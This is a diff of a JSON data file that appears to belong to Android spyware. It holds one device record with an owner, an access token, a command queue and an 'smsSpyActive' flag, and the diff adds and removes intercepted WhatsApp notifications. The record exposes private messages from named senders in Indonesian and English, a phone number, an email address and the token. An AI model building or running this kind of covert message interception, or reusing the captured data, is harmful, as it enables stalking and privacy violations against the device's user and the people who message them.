@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776951831567,
+    "lastSeen": 1776951858610,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎72 pesan dari 42 chat",
+        "time": "23/04 21:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776951835040
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Wabot",
+        "content": "📷 Thank you, Rama Yandi. The Wabot account for at6327638@gmail.com has been activated.\n\nLog in here:\nhttps://app.wabot.my/login or click button login to link your number 👇\n\nUser guide:\nhttps://docs.fatomate.com . Please check your email to get special coupon 20% off. \n\nIf you experience any issues, please let us know.",
+        "time": "23/04 21:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776951834979
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎75 pesan dari 43 chat",
+        "time": "23/04 21:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776951834666
+      },
       {
         "appName": "WhatsApp",
         "sender": "Oi: Membalas Anda",
@@ -3995,30 +4019,6 @@
         "time": "23/04 19:15",
         "pkg": "com.whatsapp",
         "receivedAt": 1776942915998
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 822-6965-3769",
-        "content": "sipp",
-        "time": "23/04 19:15",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942915794
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Khifrandev Solution",
-        "content": "oalah oke siap kak",
-        "time": "23/04 19:15",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942911185
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "april Hk",
-        "content": "singkat sekalii😢",
-        "time": "23/04 19:15",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942911169
       }
     ],
     "galleryPhotos": [],
